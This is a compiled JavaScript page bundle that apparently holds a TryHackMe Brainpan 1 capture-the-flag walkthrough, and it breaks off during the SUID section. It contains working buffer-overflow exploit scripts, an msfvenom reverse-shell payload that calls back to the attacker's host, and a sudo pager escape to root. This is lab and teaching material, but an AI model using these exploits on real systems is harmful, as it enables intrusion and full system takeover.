"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[6372],{2602:(e,n,x)=>{x.d(n,{A:()=>a});const a=x.p+"assets/images/brainpan1-validate-25c2b19a7a2f1dfa7534c4d9abd29677.png"},28453:(e,n,x)=>{x.d(n,{R:()=>i,x:()=>r});var a=x(96540);const t={},s=a.createContext(t);function i(e){const n=a.useContext(s);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),a.createElement(s.Provider,{value:n},e.children)}},36088:(e,n,x)=>{x.r(n),x.d(n,{assets:()=>o,contentTitle:()=>r,default:()=>l,frontMatter:()=>i,metadata:()=>a,toc:()=>c});const a=JSON.parse('{"id":"hacker/tryhackme/brainpan1","title":"TryHackMe Brainpan 1 Walkthrough - Buffer Overflow Exploitation Challenge","description":"Complete walkthrough of TryHackMe\'s Brainpan 1 buffer overflow challenge. Learn stack-based buffer overflow exploitation and reverse engineering techniques.","source":"@site/docs/hacker/tryhackme/brainpan1.md","sourceDirName":"hacker/tryhackme","slug":"/hacker/tryhackme/brainpan1","permalink":"/docs/hacker/tryhackme/brainpan1","draft":false,"unlisted":false,"editUrl":"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/tryhackme/brainpan1.md","tags":[{"inline":true,"label":"tryhackme","permalink":"/docs/tags/tryhackme"},{"inline":true,"label":"buffer-overflow","permalink":"/docs/tags/buffer-overflow"},{"inline":true,"label":"exploitation","permalink":"/docs/tags/exploitation"},{"inline":true,"label":"reverse-engineering","permalink":"/docs/tags/reverse-engineering"},{"inline":true,"label":"ctf","permalink":"/docs/tags/ctf"}],"version":"current","lastUpdatedBy":"Ron Amosa","lastUpdatedAt":1758526302000,"sidebarPosition":2,"frontMatter":{"title":"TryHackMe Brainpan 1 Walkthrough - Buffer Overflow Exploitation Challenge","description":"Complete walkthrough of TryHackMe\'s Brainpan 1 buffer overflow challenge. Learn stack-based buffer overflow exploitation and reverse engineering techniques.","keywords":["tryhackme brainpan","buffer overflow","stack overflow","exploitation","reverse engineering","ctf challenge","binary exploitation"],"tags":["tryhackme","buffer-overflow","exploitation","reverse-engineering","ctf"],"sidebar_position":2},"sidebar":"docsSidebar","previous":{"title":"TryHackMe Cyborg Walkthrough - Complete CTF Solution and Learning Guide","permalink":"/docs/hacker/tryhackme/cyborg"},"next":{"title":"TryHackMe Random Notes - Miscellaneous Security Tips and Techniques","permalink":"/docs/hacker/tryhackme/random"}}');var t=x(74848),s=x(28453);const i={title:"TryHackMe Brainpan 1 Walkthrough - Buffer Overflow Exploitation Challenge",description:"Complete walkthrough of TryHackMe's Brainpan 1 buffer overflow challenge. Learn stack-based buffer overflow exploitation and reverse engineering techniques.",keywords:["tryhackme brainpan","buffer overflow","stack overflow","exploitation","reverse engineering","ctf challenge","binary exploitation"],tags:["tryhackme","buffer-overflow","exploitation","reverse-engineering","ctf"],sidebar_position:2},r=void 0,o={},c=[{value:"RECON",id:"recon",level:2},{value:"Scan",id:"scan",level:3},{value:"Enumerate",id:"enumerate",level:3},{value:"EXPLOIT",id:"exploit",level:2},{value:"offset",id:"offset",level:3},{value:"bad chars",id:"bad-chars",level:3},{value:"return jmp esp address",id:"return-jmp-esp-address",level:3},{value:"shellcode",id:"shellcode",level:3},{value:"PRIVESC",id:"privesc",level:2},{value:"method 1: sudo",id:"method-1-sudo",level:3},{value:"method 2: suid binary",id:"method-2-suid-binary",level:3},{value:"validate offset",id:"validate-offset",level:4},{value:"validate payload",id:"validate-payload",level:4},{value:"validate EIP",id:"validate-eip",level:4},{value:"validate return address",id:"validate-return-address",level:4},{value:"validate shellcode",id:"validate-shellcode",level:4},{value:"correct overflow",id:"correct-overflow",level:4}];function d(e){const n={a:"a",admonition:"admonition",code:"code",em:"em",h2:"h2",h3:"h3",h4:"h4",img:"img",li:"li",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,s.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsxs)(n.admonition,{title:"Description",type:"info",children:[(0,t.jsxs)(n.p,{children:["These are my notes for the ",(0,t.jsx)(n.a,{href:"https://tryhackme.com/room/brainpan",children:"Brainpan 1 Room"})," on TryHackMe."]}),(0,t.jsx)(n.p,{children:"Credits: S/o to SnoOw, Hunterbot, Tedd and Kafka's help on this box!"}),(0,t.jsxs)(n.table,{children:[(0,t.jsx)(n.thead,{children:(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.th,{style:{textAlign:"center"},children:"OS"}),(0,t.jsx)(n.th,{style:{textAlign:"center"},children:"Level"}),(0,t.jsx)(n.th,{style:{textAlign:"center"},children:"Rating"})]})}),(0,t.jsx)(n.tbody,{children:(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"Linux"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"OSCP"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"4/5"})]})})]})]}),"\n",(0,t.jsx)(n.h2,{id:"recon",children:"RECON"}),"\n",(0,t.jsx)(n.p,{children:"First, as always, recon to see what's open"}),"\n",(0,t.jsx)(n.h3,{id:"scan",children:"Scan"}),"\n",(0,t.jsxs)(n.p,{children:["Port scanning to see what's open -- let's use ",(0,t.jsx)(n.code,{children:"threader3000"})," for speed"]}),"\n",(0,t.jsxs)(n.p,{children:["Using dievus' ",(0,t.jsx)(n.a,{href:"https://github.com/dievus/threader3000",children:"threader3000"})," multi-threaded python port scanner with Nmap integration to scan the brainpan box:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'------------------------------------------------------------   [31/31]\n        Threader 3000 - Multi-threaded Port Scanner\n                       Version 1.0.7\n                   A project by The Mayor\n------------------------------------------------------------\nEnter your target IP address or URL here: 10.10.5.188\n------------------------------------------------------------\nScanning target 10.10.5.188\nTime started: 2022-03-08 20:49:07.183965\n------------------------------------------------------------\nPort 9999 is open\nPort 10000 is open\nPort scan completed in 0:01:32.890425\n------------------------------------------------------------\nThreader3000 recommends the following Nmap scan:\n************************************************************\nnmap -p9999,10000 -sV -sC -T4 -Pn -oA 10.10.5.188 10.10.5.188\n************************************************************\nWould you like to run Nmap or quit to terminal?\n------------------------------------------------------------\n1 = Run suggested Nmap scan\n2 = Run another Threader3000 scan\n3 = Exit to terminal\n------------------------------------------------------------\nOption Selection: 1\nnmap -p9999,10000 -sV -sC -T4 -Pn -oA 10.10.5.188 10.10.5.188\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 20:51 NZDT\nNmap scan report for 10.10.5.188\nHost is up (0.28s latency).\n\nPORT      STATE SERVICE VERSION\n9999/tcp  open  abyss?\n| fingerprint-strings:\n|   NULL:\n|     _| _|\n|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|\n|     _|_| _| _| _| _| _| _| _| _| _| _| _|\n|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|\n|     [________________________ WELCOME TO BRAINPAN _________________________]\n|_    ENTER THE PASSWORD\n10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)\n|_http-title: Site doesn\'t have a title (text/html).\n|_http-server-header: SimpleHTTP/0.6 Python/2.7.3\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port9999-TCP:V=7.92%I=7%D=3/8%Time=62270AEC%P=x86_64-pc-linux-gnu%r(NUL\nSF:L,298,"_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\n_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\\nSF:x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x\nSF:20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\n_\\|\\x20\\x20\\x20\\x20_\\|\\x2\nSF:0\\x20_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x2\nSF:0\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x2\nSF:0\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|\\x20\\x20\\x20\\x20_\\|\\\nSF:x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x2\nSF:0_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x2\nSF:0_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|_\\|_\\|\\x20\\x2\nSF:0\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\\nSF:|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0_\\|_\\|_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20_\\|\\n\\n\\[________________________\\x20WELCOME\\x20TO\\x20BRAINPAN\\x2\nSF:0_________________________\\]\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20ENTER\\x2\nSF:0THE\\x20PASSWORD\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\n\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20>>\\x20");\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 61.21 seconds\n------------------------------------------------------------\nCombined scan completed in 0:02:54.620378\nPress enter to quit...\n'})}),"\n",(0,t.jsx)(n.p,{children:"We can see the following open ports:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"PORT      STATE SERVICE VERSION\n9999/tcp  open  abyss?\n| fingerprint-strings:\n|   NULL:\n|     _| _|\n|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|\n|     _|_| _| _| _| _| _| _| _| _| _| _| _|\n|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|\n|     [________________________ WELCOME TO BRAINPAN _________________________]\n|_    ENTER THE PASSWORD\n10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)\n"})}),"\n",(0,t.jsx)(n.h3,{id:"enumerate",children:"Enumerate"}),"\n",(0,t.jsxs)(n.p,{children:["Looks like a web server running on port ",(0,t.jsx)(n.code,{children:"10000"}),", I use ",(0,t.jsx)(n.code,{children:"gobuster"})," to enumerate possible directories on the server and found:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"http://10.10.5.188:10000/bin                  (Status: 301) [Size: 0] [--\x3e /bin/]\nhttp://10.10.5.188:10000/index.html           (Status: 200) [Size: 215]\n\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Open browser to ",(0,t.jsx)(n.code,{children:"http://$TARGET_IP:10000/bin"})," and found ",(0,t.jsx)(n.code,{children:"brainpan.exe"})," application."]}),"\n",(0,t.jsx)(n.p,{children:"I download the .exe and proceed to setup a buffer overflow local development environment on my Windows7 VM."}),"\n",(0,t.jsx)(n.h2,{id:"exploit",children:"EXPLOIT"}),"\n",(0,t.jsx)(n.p,{children:"I setup the usual environment in my Windows 7 VM (ip=172.16.2.125)"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"immunity debugger"}),"\n",(0,t.jsx)(n.li,{children:"mona python modules"}),"\n",(0,t.jsxs)(n.li,{children:["copy of ",(0,t.jsx)(n.code,{children:"brainpan.exe"})," to run"]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"offset",children:"offset"}),"\n",(0,t.jsx)(n.p,{children:"Using Noodles offset short cut method, I quickly find the buffer offset for my payload:"}),"\n",(0,t.jsx)(n.p,{children:"Create an offset pattern for my script:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 6700\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Use this as payload in my ",(0,t.jsx)(n.code,{children:"offset.py"})," script:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",metastring:'title="offset.py"',children:'#!/usr/bin/env python3\n\nimport socket\n\nip = "172.16.2.125"\nport = 9999\n\noffset = 0\noverflow = "A" * offset\nretn = ""\npadding = ""\npayload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A......"\npostfix = ""\n\nbuffer = overflow + retn + padding + payload + postfix\n\nprint("buffer=",len(buffer))\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print("Sending evil buffer...")\n  s.send(bytes(payload + "\\r\\n", "latin-1"))\n  print("Done!")\nexcept:\n  print("Could not connect.")\n'})}),"\n",(0,t.jsxs)(n.p,{children:["Fire this payload at my Win7 box, ",(0,t.jsx)(n.code,{children:"./offset.py"}),"."]}),"\n",(0,t.jsxs)(n.p,{children:["When Immunity Debugger crashes, read the value from ",(0,t.jsx)(n.code,{children:"EIP"})," register e.g. ",(0,t.jsx)(n.code,{children:"35724134"})]}),"\n",(0,t.jsxs)(n.p,{children:["Use metasploit ",(0,t.jsx)(n.code,{children:"pattern_offset"})," to find this pattern in the string from before:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6700 -q 35724134\n [*] Exact match at offset 524\n"})}),"\n",(0,t.jsxs)(n.p,{children:["The offset is ",(0,t.jsx)(n.code,{children:"524"}),"."]}),"\n",(0,t.jsxs)(n.p,{children:["To verify this, use the following ",(0,t.jsx)(n.code,{children:"eip.py"})," script to get 4 x B's (i.e. ",(0,t.jsx)(n.code,{children:"0x42424242"}),") written to the EIP:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",metastring:'title="eip.py"',children:'#!/usr/bin/env python3\n\nimport socket\n\nip = "172.16.2.125"\nport = 9999\n\noffset = 524\noverflow = "A" * offset\nretn = "BBBB"\npadding = ""\npayload = ""\npostfix = ""\n\nbuffer = overflow + retn + padding + payload + postfix\n\nprint("buffer=",len(buffer))\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print("buffer size:", len(buffer))\n  print("Crash Overwrite EIP: 42424242...")\n  s.send(bytes(buffer + "\\r\\n", "latin-1"))\n  print("Done!")\nexcept:\n  print("Could not connect.")\n'})}),"\n",(0,t.jsxs)(n.p,{children:["If you did everything right, there will be ",(0,t.jsx)(n.code,{children:"0x42424242"})," (i.e. 4 x B's) in the EIP."]}),"\n",(0,t.jsx)(n.h3,{id:"bad-chars",children:"bad chars"}),"\n",(0,t.jsx)(n.p,{children:"Do a quick check of bad characters to avoid in your shellcode."}),"\n",(0,t.jsxs)(n.p,{children:["Set mona work dir: ",(0,t.jsx)(n.code,{children:"!mona config -set workingfolder C:\\Users\\IEUser\\Downloads\\%p"})]}),"\n",(0,t.jsxs)(n.p,{children:["Let's use mona to create our byte array and test for bad chars starting with the nullbyte array: ",(0,t.jsx)(n.code,{children:'!mona bytearray -b "\\x00"'})]}),"\n",(0,t.jsxs)(n.p,{children:["Use our script ",(0,t.jsx)(n.code,{children:"badchar.py"})," to send the payload:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",metastring:'title="badchar.py"',children:'#!/usr/bin/env python3\n\nimport socket\n\nip = "172.16.2.125"\nport = 9999\n\noffset = 524\noverflow = "A" * offset\nretn = "BBBB"\npadding = ""\npayload = (\n"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20"\n"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40"\n"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60"\n"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80"\n"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0"\n"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0"\n"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0"\n"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff"\n)\n\nbuffer = overflow + retn + payload\n\nprint("buffer=",len(buffer))\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print("Looking for badchars...")\n  s.send(bytes(buffer + "\\r\\n", "latin-1"))\n  print("Done!")\nexcept:\n  print("Could not connect.")\n'})}),"\n",(0,t.jsxs)(n.p,{children:["When the application crashes, use mona to compare the generated saved byte array with the value of the bytearray starting from the $ESP address (",(0,t.jsx)(n.code,{children:"-a <ESP-value />"}),"):"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"!mona compare -f C:\\Users\\IEUser\\Downloads\\chatserver\\bytearray.bin -a 0022F930"})}),"\n",(0,t.jsxs)(n.p,{children:["Got unmodified status! This means the only bad char is the nullbyte (",(0,t.jsx)(n.code,{children:'"\\x00"'}),")."]}),"\n",(0,t.jsx)(n.h3,{id:"return-jmp-esp-address",children:"return jmp esp address"}),"\n",(0,t.jsxs)(n.p,{children:["Run this mona command in Immunity Debugger to find a ",(0,t.jsx)(n.code,{children:"jmp"})," address to use: ",(0,t.jsx)(n.code,{children:'!mona jmp -r esp -cpb "\\x00"'})]}),"\n",(0,t.jsx)(n.p,{children:"Looks like we only have 1 x address to choose from:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"Log data, item 3\n Address=311712F3\n Message=  0x311712f3 : jmp esp |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\IEUser\\Downloads\\brainpan.exe)\n"})}),"\n",(0,t.jsxs)(n.p,{children:["return address = ",(0,t.jsx)(n.code,{children:"0x311712f3"})," = little endian = ",(0,t.jsx)(n.code,{children:"\\xf3\\x12\\x17\\x31"}),"."]}),"\n",(0,t.jsx)(n.p,{children:"We have our return address, now it's time to create our (reverse shell) shellcode."}),"\n",(0,t.jsx)(n.h3,{id:"shellcode",children:"shellcode"}),"\n",(0,t.jsx)(n.admonition,{title:"the right shellcode?",type:"tip",children:(0,t.jsxs)(n.p,{children:["I spent a lot of time on the PRIVESC part not being able to pop root ",(0,t.jsx)(n.em,{children:"because"})," I was using a ",(0,t.jsx)(n.code,{children:"windows_reverse_tcp"}),' shell which connects successfully, but the behaviour of the commands I ran in that shell failed to get me root, whereas the same commands in the "correct" shell got me root immediately.']})}),"\n",(0,t.jsx)(n.p,{children:"The box is running Linux but the service is a Win32 executable run using WINE, while a windows_reverse_tcp shell connects successfully, I will document the process that got root successfully, starting with the right shell."}),"\n",(0,t.jsx)(n.p,{children:"Thanks to tedd from the stream for figuring out the linux reverse shell to use which got us root."}),"\n",(0,t.jsx)(n.p,{children:"Let's create the following linux reverse shell:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.55.83 LPORT=80 EXITFUNC=thread -b "\\x00" -f c -e x86/shikata_ga_nai\n'})}),"\n",(0,t.jsx)(n.p,{children:"Add it to our payload and run:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",metastring:'title="thm-linux.py"',children:'#!/usr/bin/env python3\n\nimport socket\n\nip = "10.10.94.62"\nport = 9999\n\noffset = 524\noverflow = "A" * offset\nretn = "\\xf3\\x12\\x17\\x31" # found using mona\npadding = "\\x90" * 16\npayload = (\n"\\xdb\\xd8\\xd9\\x74\\x24\\xf4\\x5a\\xbe\\x69\\xb2\\xd7\\x92\\x2b\\xc9\\xb1"\n"\\x12\\x31\\x72\\x17\\x03\\x72\\x17\\x83\\xab\\xb6\\x35\\x67\\x1a\\x6c\\x4e"\n"\\x6b\\x0f\\xd1\\xe2\\x06\\xad\\x5c\\xe5\\x67\\xd7\\x93\\x66\\x14\\x4e\\x9c"\n"\\x58\\xd6\\xf0\\x95\\xdf\\x11\\x98\\x2f\\x2b\\xd5\\x0b\\x58\\x29\\x19\\xab"\n"\\xc8\\xa4\\xf8\\x1b\\x8e\\xe6\\xab\\x08\\xfc\\x04\\xc5\\x4f\\xcf\\x8b\\x87"\n"\\xe7\\xbe\\xa4\\x54\\x9f\\x56\\x94\\xb5\\x3d\\xce\\x63\\x2a\\x93\\x43\\xfd"\n"\\x4c\\xa3\\x6f\\x30\\x0e"\n)\npostfix = ""\n\nbuffer = overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print("buffer size:", len(buffer))\n  print("Sending evil buffer...")\n  s.send(bytes(buffer + "\\r\\n", "latin-1"))\n  print("Done!")\nexcept:\n  print("Could not connect.")\n'})}),"\n",(0,t.jsxs)(n.p,{children:["Setup listener on attack machine: ",(0,t.jsx)(n.code,{children:"sudo rlwrap nc -lnvp 80"})]}),"\n",(0,t.jsxs)(n.p,{children:["Send payload ",(0,t.jsx)(n.code,{children:"./thm-linux.py"})]}),"\n",(0,t.jsx)(n.p,{children:"Success:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ sudo rlwrap nc -lnvp 80                                                                                     1 \u2a2f\nlistening on [any] 80 ...\nconnect to [10.11.55.83] from (UNKNOWN) [10.10.73.41] 42786\n/usr/bin/python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\npuck@brainpan:/home/puck$\n"})}),"\n",(0,t.jsx)(n.admonition,{title:"upgrade your shell",type:"info",children:(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["Find python on the box: ",(0,t.jsx)(n.code,{children:"which python3"})]}),"\n",(0,t.jsxs)(n.li,{children:["Upgrade your shell: ",(0,t.jsx)(n.code,{children:"/usr/bin/python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"})]}),"\n"]})}),"\n",(0,t.jsx)(n.h2,{id:"privesc",children:"PRIVESC"}),"\n",(0,t.jsx)(n.p,{children:"There are (supposedly) two routes to root: sudo, and a suid binary on the box. Let's look at both."}),"\n",(0,t.jsx)(n.h3,{id:"method-1-sudo",children:"method 1: sudo"}),"\n",(0,t.jsxs)(n.p,{children:["Once we have our upgraded shell, we try out ",(0,t.jsx)(n.code,{children:"sudo -l"})," to see what we can see:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"sudo -l\nsudo -l\nMatching Defaults entries for puck on this host:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser puck may run the following commands on this host:\n    (root) NOPASSWD: /home/anansi/bin/anansi_util\npuck@brainpan:/home/puck$\n"})}),"\n",(0,t.jsx)(n.p,{children:"So we have a command we can run as root, with no password required."}),"\n",(0,t.jsxs)(n.p,{children:["When I run that command ",(0,t.jsx)(n.code,{children:"sudo /home/anansi/bin/anansi_util"}),", I get this:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"sudo /home/anansi/bin/anansi_util\nsudo /home/anansi/bin/anansi_util\nUsage: /home/anansi/bin/anansi_util [action]\nWhere [action] is one of:\n  - network\n  - proclist\n  - manual [command]\npuck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util\n"})}),"\n",(0,t.jsxs)(n.p,{children:["The ",(0,t.jsx)(n.code,{children:"manual [command]"})," looks the most interesting because we get to feed it input."]}),"\n",(0,t.jsxs)(n.p,{children:["Long story short, it runs the ",(0,t.jsx)(n.code,{children:"man"})," command and gives us a manual page based on a keyword we give it. Myself, along with the collective skills of my Twitch chat crew, we deduce that we will try and pop a shell from inside the ",(0,t.jsx)(n.code,{children:"less"})," output that ",(0,t.jsx)(n.code,{children:"man"})," gives i.e. we try and enter ",(0,t.jsx)(n.code,{children:"!/bin/bash"})," from inside the ",(0,t.jsx)(n.code,{children:"man"})," output (which is running as ",(0,t.jsx)(n.code,{children:"sudo"}),") and essentially will be ",(0,t.jsx)(n.code,{children:"root"})," running the shell command."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"sudo /home/anansi/bin/anansi_util manual id\nsudo /home/anansi/bin/anansi_util manual id\nNo manual entry for manual\nWARNING: terminal is not fully functional\n!/bin/bash\n!/bin/bash\nroot@brainpan:/usr/share/man#\n"})}),"\n",(0,t.jsx)(n.p,{children:"Congratulations. We have root."}),"\n",(0,t.jsx)(n.h3,{id:"method-2-suid-binary",children:"method 2: suid binary"}),"\n",(0,t.jsxs)(n.p,{children:["After initial access to the box, I did ",(0,t.jsx)(n.code,{children:"find . -perm /4000"})," and (I think it was kafka?) saw ",(0,t.jsx)(n.code,{children:"/usr/local/bin/validate"})," in the results."]}),"\n",(0,t.jsxs)(n.p,{children:["I copied the binary to shared web 